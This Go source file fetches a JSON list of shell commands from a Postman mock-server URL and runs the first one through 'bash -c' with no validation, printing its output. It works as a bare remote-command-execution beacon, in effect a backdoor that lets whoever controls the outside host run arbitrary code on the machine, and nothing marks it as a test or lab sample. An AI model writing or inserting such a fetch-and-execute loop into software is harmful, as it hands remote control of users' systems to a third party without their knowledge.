package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
)

type RESPONSE struct {
	Commands []string `json:"commands"`
}

func main() {
	response := RESPONSE{}
	requestTodoAndParse(&response, "https://dd356dc5-d87a-4860-b8e0-948eea6911a0.mock.pstmn.io/")
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd := exec.Command("bash", "-c", response.Commands[0])
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	_ = cmd.Run()
	fmt.Println(stdout.String())
}

func requestTodoAndParse(r *RESPONSE, url string) {
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalln(err)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	sb := string(body)
	err = json.Unmarshal([]byte(sb), r)
}
